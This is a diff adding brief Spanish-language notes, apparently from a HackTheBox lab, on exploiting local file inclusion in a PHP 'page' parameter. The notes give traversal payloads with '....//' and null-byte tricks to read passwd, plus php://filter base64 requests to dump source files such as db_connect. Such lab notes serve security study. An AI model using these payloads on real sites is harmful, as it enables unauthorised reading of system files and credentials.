@@ -1,0 +1,23 @@
+
+
+firefox:::  http://targed_url_here.htb/index.php?page=home
+
+firefox:::  http://targed_url_here.htb/index.php?page=....//....//....//....//....//passwd%00
+
+						'../'  '....//'  evasion de sanitizacion debil
+
+						%00    null bite para evitar extensiones 'en este casi .php'
+
+
+*** *** ***  BASE64 ENCODEFILE  home 
+
+firefox:::  http://targed_url_here.htb/index.php?page=php://filter/convert.base64-encode/resource=home
+
+				::  echo 'Fsdf....asd==' | base64 -d | vim -
+
+
+							<?php include 'db_connect.php' ?>   ...<3 <3 <3
+
+firefox:::  http://targed_url_here.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect
+
+				::  echo 'Adoi....ivId0K' | base64 -d | vim -
